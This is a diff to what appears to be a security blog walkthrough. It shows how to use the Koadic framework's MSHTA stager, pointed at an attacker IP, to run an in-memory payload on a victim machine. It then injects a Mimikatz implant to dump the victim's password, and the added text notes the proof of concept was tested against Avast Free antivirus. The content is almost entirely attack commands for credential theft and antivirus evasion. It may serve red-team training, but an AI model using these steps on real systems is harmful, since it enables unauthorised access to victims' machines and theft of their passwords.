@@ -10,17 +10,23 @@ categories:
 
 Watch video tutorial here: [Video](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/videos/mimikatz%20with%20koadic.mp4)
 
+We are using js/mshta module as it will serves payloads in memory using MSHTA.exe HTML Applications for us. This poc is test on Avast Free AV and koadic managed to dump the password using Mimikatz implant.
+
+Run koadic and create our payload:
+
     ./koadic
     use stager/js/mshta
     set srvhost [attacker ip]
     run
 
-Copy the command line and paste on victim machine
+Copy the command line and paste on victim machine.
+
+Run mimikatz_dotnet2js:
 
     use implant/inject/mimikatz_dotnet2js
     set zombie 0
     run
 
-You can see, we can dump the password using this mimikatz module.
+As you can see, we can dump victim's password using this mimikatz module.
 
 ![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/mimikatz_koadic.PNG)
